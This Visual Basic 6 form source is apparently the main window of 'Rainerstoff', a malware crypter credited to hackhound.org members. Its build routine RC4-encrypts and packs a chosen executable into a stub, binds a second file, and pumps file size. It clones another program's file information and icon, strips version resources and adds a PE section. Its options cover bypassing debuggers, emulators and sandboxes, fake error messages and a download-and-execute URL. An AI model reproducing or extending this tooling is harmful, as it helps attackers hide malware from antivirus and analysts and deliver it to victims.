         _ExtentY        =   661
         Caption         =   "File Pumper"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   8421504
         Caption         =   "File Pumper"
         BackColor       =   15000804
         ForeColor       =   8421504
      End
      Begin prjCryptox.Check chkDebuggers 
         Height          =   255
         Left            =   360
         TabIndex        =   47
         Top             =   1440
         Width           =   2775
         _ExtentX        =   4895
         _ExtentY        =   450
         Caption         =   "Bypass Debuggers"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   8421504
         Caption         =   "Bypass Debuggers"
         BackColor       =   15000804
         ForeColor       =   8421504
      End
      Begin prjCryptox.Check chkSection 
         Height          =   375
         Left            =   360
         TabIndex        =   46
         Top             =   1080
         Width           =   2655
         _ExtentX        =   4683
         _ExtentY        =   661
         Caption         =   "Add Section"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   8421504
         Caption         =   "Add Section"
         BackColor       =   15000804
         ForeColor       =   8421504
      End
      Begin prjCryptox.Check chkEmulation 
         Height          =   255
         Left            =   360
         TabIndex        =   36
         Top             =   840
         Width           =   2655
         _ExtentX        =   4683
         _ExtentY        =   450
         Caption         =   "Bypass Emulator"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   8421504
         Caption         =   "Bypass Emulator"
         BackColor       =   15000804
         ForeColor       =   8421504
      End
      Begin prjCryptox.Check chkPassword 
         Height          =   375
         Left            =   360
         TabIndex        =   28
         Top             =   480
         Width           =   2775
         _ExtentX        =   4895
         _ExtentY        =   661
         Caption         =   "Protect w/ Password"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   8421504
         Caption         =   "Protect w/ Password"
         BackColor       =   15000804
         ForeColor       =   8421504
      End
      Begin VB.Label lblReversing 
         BackStyle       =   0  'Transparent
         Caption         =   "The crypted EXE will be protected with some reversing options that you select."
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   -1  'True
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00ACACAC&
         Height          =   735
         Left            =   240
         TabIndex        =   29
         Top             =   2040
         Width           =   2655
      End
   End
   Begin prjCryptox.xFrame frmeAbout 
      Height          =   2775
      Left            =   1440
      TabIndex        =   62
      Top             =   2520
      Width           =   3615
      _ExtentX        =   6376
      _ExtentY        =   4895
      BackColor       =   15000804
      BorderColor     =   12632256
      ButtonColor     =   8283750
      ButtonHighlightColor=   12298664
      ColorScheme     =   3
      Caption         =   "About"
      Enabled         =   -1  'True
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      FontBold        =   -1  'True
      ForeColor       =   8283750
      FontItalic      =   0   'False
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      GradientBottom  =   15920108
      HeaderGradientBottom=   14606046
      HeaderGradientTop=   16448250
      Begin VB.Label lblShout4 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "BinaryEvil"
         ForeColor       =   &H00808080&
         Height          =   255
         Left            =   240
         TabIndex        =   71
         Top             =   2280
         Width           =   1095
      End
      Begin VB.Label lblShout3 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "cool_mofo_2"
         ForeColor       =   &H00808080&
         Height          =   255
         Left            =   240
         TabIndex        =   70
         Top             =   2040
         Width           =   1095
      End
      Begin VB.Label lblShout2 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "ap0calypse"
         ForeColor       =   &H00808080&
         Height          =   255
         Left            =   240
         TabIndex        =   68
         Top             =   1800
         Width           =   855
      End
      Begin VB.Label lblShout1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "steve10120"
         ForeColor       =   &H00808080&
         Height          =   255
         Left            =   240
         TabIndex        =   67
         Top             =   1560
         Width           =   855
      End
      Begin VB.Label lblShouts 
         BackStyle       =   0  'Transparent
         Caption         =   "Shouts:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H007E6666&
         Height          =   255
         Left            =   240
         TabIndex        =   66
         Top             =   1320
         Width           =   1215
      End
      Begin VB.Label lblMail 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "rainerstoff@hackhound.org"
         ForeColor       =   &H00808080&
         Height          =   255
         Left            =   240
         TabIndex        =   65
         Top             =   960
         Width           =   2055
      End
      Begin VB.Label lblDeveloper 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "carb0n"
         ForeColor       =   &H00808080&
         Height          =   255
         Left            =   240
         TabIndex        =   64
         Top             =   720
         Width           =   855
      End
      Begin VB.Label lblDevelopment 
         BackStyle       =   0  'Transparent
         Caption         =   "Development:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H007E6666&
         Height          =   255
         Left            =   240
         TabIndex        =   63
         Top             =   480
         Width           =   1215
      End
   End
   Begin VB.Label Label2 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      Caption         =   "hhhhhh"
      ForeColor       =   &H00808080&
      Height          =   135
      Left            =   1680
      TabIndex        =   69
      Top             =   4440
      Width           =   2895
   End
   Begin VB.Label lblLicense 
      BackStyle       =   0  'Transparent
      Caption         =   "Licensed to:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   120
      TabIndex        =   5
      Top             =   6000
      Width           =   2895
   End
   Begin VB.Label lblVersion 
      BackStyle       =   0  'Transparent
      Caption         =   "Version: 3.2b"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   120
      TabIndex        =   4
      Top             =   6240
      Width           =   1215
   End
   Begin VB.Shape Shape1 
      BackColor       =   &H00404040&
      BackStyle       =   1  'Opaque
      BorderStyle     =   0  'Transparent
      Height          =   855
      Left            =   0
      Top             =   5880
      Width           =   5175
   End
   Begin VB.Image Image1 
      Height          =   6795
      Left            =   0
      Picture         =   "frmMain.frx":771D9
      Top             =   -240
      Width           =   5220
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Rainerstoff Series by carb0n
'First Modifications - June 27, 2009
'1.0 - July 06, 2009
'Crypter using Resources

Option Explicit
Dim cDialog As cFileDialog

Private Sub chkBind_Click() 'Pretty self explanatory, if the chkBind is checked then load the dialog.

cDialog.CancelError = True
On Error GoTo CancelErr

If chkBind.Value = vbChecked Then
With cDialog
.DialogTitle = "Select PE"
.Filter = "PE Files" & "(*.exe)|*.exe|" & "All Files" & " (*.*)|*.*"
.FilterIndex = 1
.ShowOpen
txtBind.Text = cDialog.FileName
End With
Else
End If

CancelErr:
If Err.Number = cdlCancel Then
MsgBox "You clicked cancel! Cancelling the process and aborting!", vbInformation, "Rainerstoff"
chkBind.Value = Unchecked
Exit Sub
End If

End Sub

Private Sub chkClone_Click()

cDialog.CancelError = True
On Error GoTo CancelErr

If chkClone.Value = Checked Then
With cDialog
.DialogTitle = "Select PE to Clone!"
.Filter = "PE Files" & "(*.exe)|*.exe|" & "All Files" & " (*.*)|*.*"
.FilterIndex = 1
.ShowOpen
txtClone.Text = cDialog.FileName
End With
Else
End If

CancelErr:
If Err.Number = cdlCancel Then
MsgBox "You clicked cancel! Cancelling the process and aborting!", vbInformation, "Rainerstoff"
chkClone.Value = Unchecked
Exit Sub
End If

End Sub

Private Sub chkDownload_Click()

Dim Bajar As String, eURL As String, eDownload As String
eURL = "Please enter the url to download."
eDownload = "UrlDownloadToFile"

If chkDownload.Value = vbChecked Then
Bajar = InputBox(eURL, eDownload, "http://")
txtBajar.Text = Bajar
Else
End If

End Sub

Private Sub chkPassword_Click() 'Select the password and store it on the text box.

Dim Respuesta As String, pSelector As String, pEnter As String
pSelector = "Please enter the password."
pEnter = "Password Selector"
If chkPassword.Value = 1 Then
Respuesta = InputBox(pSelector, pEnter, Chr(32))
txtRespuesta.Text = Respuesta
Else
End If

End Sub

Private Sub cmdAbout_Click()
    frmLogin.Visible = False
    frmeGeneral.Visible = False
    frmeAntis.Visible = False
    frmeFake.Visible = False
    frmeReversing.Visible = False
    frmeIcon.Visible = False
    frmeAbout.Visible = True
Call PlaySoundResource(2)
End Sub

Public Function DeleteIt()
DeleteKey "HKCU\Software\Hack Hound\Rainerstoff\User"
DeleteKey "HKCU\Software\Hack Hound\Rainerstoff\Password"
DeleteKey "HKCU\Software\Hack Hound\Rainerstoff\Automatically"
txtUser.Text = vbNullString
txtPass.Text = vbNullString
End Function

Public Function SaveIt()
CreateKey "HKCU\Software\Hack Hound\Rainerstoff\User", txtUser.Text
CreateKey "HKCU\Software\Hack Hound\Rainerstoff\Password", txtPass.Text
CreateKey "HKCU\Software\Hack Hound\Rainerstoff\Automatically", "1"
End Function

Private Sub cmdAnti_Click()
 frmLogin.Visible = False
    frmeGeneral.Visible = False
    frmeAntis.Visible = True
    frmeFake.Visible = False
    frmeReversing.Visible = False
    frmeIcon.Visible = False
Call PlaySoundResource(2)
End Sub

Private Sub cmdAuthenticate_Click()
    frmLogin.Visible = True
    frmeGeneral.Visible = False
    frmeAntis.Visible = False
    frmeFake.Visible = False
    frmeReversing.Visible = False
    frmeIcon.Visible = False
Call PlaySoundResource(2)
End Sub

Private Sub cmdBrowse_Click()

Call PlaySoundResource(2)

cDialog.CancelError = True
On Error GoTo CancelErr

With cDialog
.DialogTitle = "PE Files"
.Filter = "PE Files" & "(*.exe)|*.exe|" & "All Files" & " (*.*)|*.*"
.FilterIndex = 1
.ShowOpen
txtFile.Text = cDialog.FileName
End With
'ReadEOFData (txtFile.Text)

CancelErr:
If Err.Number = cdlCancel Then
MsgBox "You clicked cancel! Cancelling the process and aborting!", vbInformation, "Rainerstoff"
Exit Sub
End If

End Sub

Public Sub cmdBuild_Click()

On Error Resume Next

Call PlaySoundResource(2)

pG.Visible = True

cDialog.CancelError = True
On Error GoTo CancelErr

'----------------------------------------------------------------------------------
Dim bBytes() As Byte
Dim sFile As Long
Dim sEOF As String
'----------------------------------------------------------------------------------

sFile = FreeFile

'----------------------------------------------------------------------------------
If txtFile.Text = "" Or txtFile.Text = "C:\File.exe" Then
MsgBox "Please select a file.", vbInformation, "Rainerstoff"
Exit Sub
Else
End If
'----------------------------------------------------------------------------------
sEOF = ReadEOFData(txtFile.Text)

'----------------------------------------------------------------------------------
cDialog.DialogTitle = "Select Output"
cDialog.DefaultExt = "exe"
cDialog.FileName = "stealthed.exe"
cDialog.Filter = "PE Files" & "(*.exe)|*.exe|" & "All Files" & " (*.*)|*.*"
cDialog.ShowSave
vbWriteByteFile cDialog.FileName, LoadResData(32767, "CODE")
'----------------------------------------------------------------------------------

'----------------------------------------------------------------------------------
pG.Value = pG.Value + 10
Call SetResource(1000, 1001, IIf(chkEmulation.Value = vbChecked, "1", "0"), cDialog.FileName) 'Sets the resource.
Call SetResource(1000, 1002, IIf(chkUniversal.Value = vbChecked, "1", "0"), cDialog.FileName) 'Sets the resource.
Call SetResource(1000, 1003, IIf(chkM1.Value = vbChecked, "1", "0"), cDialog.FileName) 'Sets the resource.
Call SetResource(1000, 1004, IIf(chkPassword.Value = vbChecked, "1", "0"), cDialog.FileName) 'Sets the resource.
Call SetResource(1000, 1005, ROT13(txtRespuesta.Text), cDialog.FileName) 'Sets the resource.
Call SetResource(1000, 1006, ROT13(txtTitle.Text), cDialog.FileName) 'Sets the resource.
Call SetResource(1000, 1007, ROT13(txtDescription.Text), cDialog.FileName) 'Sets the resource.
Call SetResource(1000, 1008, txtKey.Text, cDialog.FileName) 'Sets the resource, this is the encryption key.
Call SetResource(1000, 1011, IIf(chkFake.Value = vbChecked, "1", "0"), cDialog.FileName)
'Call SetResource(1000, 1013, IIf(chkDownload.Value = vbChecked, "1", "0"), cDialog.FileName) 'Sets the resource.
Call SetResource(1000, 1014, ROT13(txtBajar.Text), cDialog.FileName) 'Sets the resource.
Call SetResource(1000, 1015, txtStyle.Text, cDialog.FileName) 'Sets the resource.
Call SetResource(1000, 1016, IIf(chkBoxie.Value = vbChecked, "1", "0"), cDialog.FileName) 'Sets the resource.
Call SetResource(1000, 1017, IIf(chkM2.Value = vbChecked, "1", "0"), cDialog.FileName) 'Sets the resource.
'----------------------------------------------------------------------------------

bBytes = LoadFile(txtFile.Text)
If chkPack.Value = Checked Then bBytes = CompressData(bBytes)
RC4ED bBytes(), ROT13(txtKey.Text)
Call SetResourceBytes(1000, 1009, bBytes, cDialog.FileName)
Call SetResource(1000, 1010, FileLen(txtFile.Text), cDialog.FileName)
'----------------------------------------------------------------------------------

'----------------------------------------------------------------------------------
pG.Value = pG.Value + 40
If chkBind.Value = Checked Then
If FileExists(txtBind.Text) Then
bBytes = LoadFile(txtBind.Text)
RC4ED bBytes(), ROT13(txtKey.Text)
Call SetResourceBytes(1000, 8888, bBytes, cDialog.FileName)
Call SetResource(1000, 8887, GetFile(txtBind.Text), cDialog.FileName)
End If
End If
'----------------------------------------------------------------------------------

'----------------------------------------------------------------------------------
Call WriteEOFData(cDialog.FileName, sEOF)
'----------------------------------------------------------------------------------

'----------------------------------------------------------------------------------
If chkPump.Value = vbChecked Then
AddBytes cDialog.FileName, txtPump.Text
AddBytes cDialog.FileName, txtPump.Text, "Rainerstoff"
End If
'----------------------------------------------------------------------------------

'----------------------------------------------------------------------------------
If chkIcon.Value = Checked Then
Call ChangeIcon(cDialog.FileName, txtIcon.Text)
Else
End If
'----------------------------------------------------------------------------------

'----------------------------------------------------------------------------------
If chkClone.Value = vbChecked Then
CloneFileInformation txtClone.Text, cDialog.FileName
'If Dir(Environ("tmp") & "\tmpicon.ico") <> "" Then Kill Environ("tmp") & "\tmpicon.ico"
'ExtractIcon txtClone.Text, Environ("tmp") & "\tmpicon.ico"
'ChangeIcon cDialog.FileName, Environ("tmp") & "\tmpicon(1).ico"
End If
'----------------------------------------------------------------------------------

'----------------------------------------------------------------------------------
pG.Value = pG.Value + 50
If chkValidate.Value = vbChecked Then
PatchEOF (cDialog.FileName)
Else
End If
'----------------------------------------------------------------------------------

'----------------------------------------------------------------------------------
If chkNull.Value = vbChecked Then
DelVerInfoResource (cDialog.FileName)
Else
End If
'----------------------------------------------------------------------------------

'----------------------------------------------------------------------------------
If chkSection.Value = vbChecked Then
Call AddSection(cDialog.FileName, ".Rainer", 5000, &H60000020)
End If
'----------------------------------------------------------------------------------

'----------------------------------------------------------------------------------
If pG.Value = 100 Then
Call PlaySoundResource(3)
MsgBox "Difference: " & Pack.CompressedRatio(LoadFile(txtFile.Text)) & " %" & vbCrLf & "Old File Size: " & FileLen(txtFile.Text) / 1024 & " KB" & vbCrLf & "Compressed Size: " & FileLen(cDialog.FileName) / 1024 & " KB" & vbCrLf & "EOF Data : " & Len(ReadEOFData(txtFile.Text)) & " Bytes" & vbCrLf & "Encryption : RC4 & XOR", vbInformation, "Rainerstoff"
End If
pG.Value = 0
pG.Visible = False
'----------------------------------------------------------------------------------



CancelErr:
If Err.Number = cdlCancel Then
MsgBox "You clicked cancel! Cancelling the process and aborting!", vbInformation, "Rainerstoff"
Exit Sub
End If
End Sub

Private Sub cmdFakeMessage_Click()
 frmLogin.Visible = False
    frmeGeneral.Visible = False
    frmeAntis.Visible = False
    frmeFake.Visible = True
    frmeReversing.Visible = False
    frmeIcon.Visible = False
Call PlaySoundResource(2)
End Sub

Public Sub cmdFakeMsgTest_Click()
On Error Resume Next


If cmbStyle.Text = "Critical" Then
txtStyle.Text = vbCritical
Else
If cmbStyle.Text = "Exclamation" Then
txtStyle.Text = vbExclamation
Else
If cmbStyle.Text = "Information" Then
txtStyle.Text = vbInformation
Else
If cmbStyle.Text = "Question" Then
txtStyle.Text = vbQuestion

End If
End If
End If
End If

MsgBox txtDescription.Text, txtStyle.Text, txtTitle.Text

End Sub

Private Sub cmdGeneral_Click()
    frmeGeneral.Visible = True
    frmeAntis.Visible = False
    frmeFake.Visible = False
    frmeReversing.Visible = False
    frmeIcon.Visible = False
    frmLogin.Visible = False
   Call PlaySoundResource(2)
End Sub

Private Sub cmdIcon_Click()
 frmLogin.Visible = False
    frmeGeneral.Visible = False
    frmeAntis.Visible = False
    frmeFake.Visible = False
    frmeReversing.Visible = False
    frmeIcon.Visible = True
    Call PlaySoundResource(2)
End Sub

Private Sub cmdLogin_Click()
On Error Resume Next
Dim Auto As String

Call PlaySoundResource(2)

'-----------------------------------------------------------
Auto = ReadKey("HKCU\Software\Hack Hound\Rainerstoff\Automatically")
If Auto = "" Then
Call SaveIt
MsgBox "Next time you execute Rainerstoff, it will have the user and password already set for you.", vbInformation, "Rainerstoff"
Else
End If
'------------------------------------------------------------

'------------------------------------------------------------
If Check("http://www.hackhound.org/Rainerstoff/Keys.txt", txtUser.Text, txtPass.Text) = True Then
'Do here.
cmdGeneral.Enabled = True
cmdAnti.Enabled = True
cmdFakeMessage.Enabled = True
cmdReversing.Enabled = True
cmdIcon.Enabled = True
cmdBuild.Enabled = True
cmdBrowse.Enabled = True
cmdLogin.Enabled = False
'------------------------------------------------------------

'------------------------------------------------------------
lblLicense.Caption = "Licensed to:" & " " & txtUser.Text
'------------------------------------------------------------

'------------------------------------------------------------
    frmeGeneral.Visible = True
    frmeAntis.Visible = False
    frmeFake.Visible = False
    frmeReversing.Visible = False
    frmeIcon.Visible = False
    frmLogin.Visible = False
    frmeAbout.Visible = False
    cmdAuthenticate.Enabled = False
'------------------------------------------------------------

Else
MsgBox "You have entered an incorrect user/password!", vbInformation, "Rainerstoff"
Exit Sub
End If

End Sub

Public Function Manual()
On Error Resume Next

Dim Auto As String
Auto = ReadKey("HKCU\Software\Hack Hound\Rainerstoff\Automatically")
If Auto = "1" Then
txtUser.Text = ReadKey("HKCU\Software\Hack Hound\Rainerstoff\User")
txtPass.Text = ReadKey("HKCU\Software\Hack Hound\Rainerstoff\Password")
End If
End Function

Private Sub cmdReversing_Click()
 frmLogin.Visible = False
    frmeGeneral.Visible = False
    frmeAntis.Visible = False
    frmeFake.Visible = False
    frmeReversing.Visible = True
    frmeIcon.Visible = False
Call PlaySoundResource(2)
End Sub

Private Sub cmdSelectIcon_Click()  'Pretty self explanatory, if the Icon is checked then load the dialog.

cDialog.CancelError = True
On Error GoTo CancelErr

With cDialog
.DialogTitle = "Please select a icon"
.FileName = vbNullString
.DefaultExt = "ico"
.Filter = "Icon Files" & "(*.ico) | *.ico"
.ShowOpen
End With
txtIcon.Text = cDialog.FileName
Picture1.Picture = LoadPicture(cDialog.FileName)

CancelErr:
If Err.Number = cdlCancel Then
MsgBox "You clicked cancel! Cancelling the process and aborting!", vbInformation, "Rainerstoff"
chkIcon.Value = Unchecked
Exit Sub
End If

End Sub

Public Function FileExists(ByVal strPathName As String) As Integer

Dim intFileNum As Integer
On Error Resume Next

If Right$(strPathName, 1) = "\" Then
strPathName = Left$(strPathName, Len(strPathName) - 1)
End If
intFileNum = FreeFile
Open strPathName For Input As intFileNum
FileExists = IIf(Err, False, True)
Close intFileNum
Err = 0

End Function

Public Function vbWriteByteFile(ByVal sFileName As String, lpByte() As Byte) As Boolean

Dim fhFile As Integer
fhFile = FreeFile
Open sFileName For Binary As #fhFile
Put #fhFile, , lpByte()
Close #fhFile

End Function

Public Function GetFile(S As String) As String

Dim i As Integer
Dim j As Integer
i = 0
j = 0
i = InStr(S, "\")
Do While i <> 0
j = i
i = InStr(j + 1, S, "\")
Loop
If j = 0 Then
GetFile = ""
Else
GetFile = Right$(S, Len(S) - j)
End If

End Function

Public Function LoadFile(ByVal sName As String) As Byte()

Dim nFile As Integer
Dim arrFile() As Byte
nFile = FreeFile
Open sName For Binary As #nFile
ReDim arrFile(LOF(nFile) - 1)
Get #nFile, , arrFile
Close #nFile
LoadFile = arrFile

End Function

Public Function ReadEOFData(sFilePath As String) As String

On Error GoTo Err:
Dim sFileBuf As String, sEOFBuf As String, sChar As String
Dim lFF As Long, lPos As Long, lPos2 As Long, lCount As Long
If Dir(sFilePath) = "" Then GoTo Err:
lFF = FreeFile
Open sFilePath For Binary As #lFF
sFileBuf = Space(LOF(lFF))
Get #lFF, , sFileBuf
Close #lFF
lPos = InStr(1, StrReverse(sFileBuf), GetNullBytes(30))
sEOFBuf = (Mid(StrReverse(sFileBuf), 1, lPos - 1))
ReadEOFData = StrReverse(sEOFBuf)
If ReadEOFData = "" Then
'MsgBox "EOF data was not detected!", vbInformation, ""
End If
Exit Function
Err:
ReadEOFData = vbNullString

End Function

Sub WriteEOFData(sFilePath As String, sEOFData As String)

Dim sFileBuf As String
Dim lFF As Long
On Error Resume Next
If Dir(sFilePath) = "" Then Exit Sub
lFF = FreeFile
Open sFilePath For Binary As #lFF
sFileBuf = Space(LOF(lFF))
Get #lFF, , sFileBuf
Close #lFF
Kill sFilePath
lFF = FreeFile
Open sFilePath For Binary As #lFF
Put #lFF, , sFileBuf & sEOFData
Close #lFF

End Sub

Public Function GetNullBytes(lNum) As String

Dim sBuf As String
Dim i As Integer
For i = 1 To lNum
sBuf = sBuf & Chr(0)
Next
GetNullBytes = sBuf

End Function

Private Function RandomNumber() As Integer

Dim Var1 As String
Randomize
Var1 = Int(9 * Rnd)
RandomNumber = Var1

End Function

Private Function RandomLetter() As String

Dim Var1 As String
Anfang:
Dim Keyset As String
Keyset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Randomize
Var1 = Int(26 * Rnd)
If Var1 = 0 Then GoTo Anfang
RandomLetter = Mid(Keyset, Var1, 1)

End Function

Public Function Random()

txtKey.Text = ""
Dim i As Integer
For i = 1 To 60
If i = 2 Or i = 4 Or i = 6 Then
txtKey.Text = txtKey.Text & RandomNumber
Else
txtKey.Text = txtKey.Text & RandomLetter
End If
Next i

End Function

Private Sub cmdSettings_Click()
On Error Resume Next

Call PlaySoundResource(2)

'---------------------------------------------------------------
If txtFile.Text = "" Or txtFile.Text = "C:\File.exe" Then
MsgBox "Please select a file.", vbInformation, "Rainerstoff"
Exit Sub
Else
End If
'---------------------------------------------------------------

chkPack.Value = vbChecked
chkNull.Value = vbChecked
chkUniversal.Value = vbChecked
chkM1.Value = vbChecked
chkM2.Value = vbChecked
chkBoxie.Value = vbChecked
End Sub

Private Sub Form_Initialize()
On Error Resume Next

Call PlaySoundResource(1)
Set cDialog = New cFileDialog
Call Manual

cmdGeneral.Enabled = False
cmdAnti.Enabled = False
cmdFakeMessage.Enabled = False
cmdReversing.Enabled = False
cmdIcon.Enabled = False
cmdBuild.Enabled = False
cmdBrowse.Enabled = False

If CheckConnection = True Then
cmdLogin.Enabled = True
Else
cmdLogin.Enabled = False
MsgBox "Please make sure you have a working internet connection. You will be unable to use this application until you have a working internet connection. Also make sure if you have a firewall that this application is added to the trusted zone.", vbInformation, "Rainerstoff"
End If
End Sub

Private Sub Form_Load()
On Error Resume Next
Call Random
End Sub

Public Function ROT13(ByVal sData As String, Optional ByVal Decrypt As Boolean = False) As String

Dim i As Long

For i = 1 To Len(sData)
ROT13 = ROT13 & Chr$(Asc(Mid$(sData, i, 1)) + IIf((Decrypt = True), -13, 13))
Next i

End Function

Private Sub chkPump_Click()
Dim Pumper As String, Des As String, Tit As String
Des = "What is the amount of kb's that you want to add? 1000 = 1kb"
Tit = "File Pumper"
If chkPump.Value = vbChecked Then
Pumper = InputBox(Des, Tit, "")
txtPump.Text = Pumper
Else
End If
End Sub

Private Sub Form_Terminate()
Unload frmEULA
Unload SplashForm
Unload Me
End
End Sub

Private Sub Form_UNLoad(cancel As Integer)
Unload frmEULA
Unload SplashForm
Unload Me
Call PlaySoundResource(2)
End
End Sub

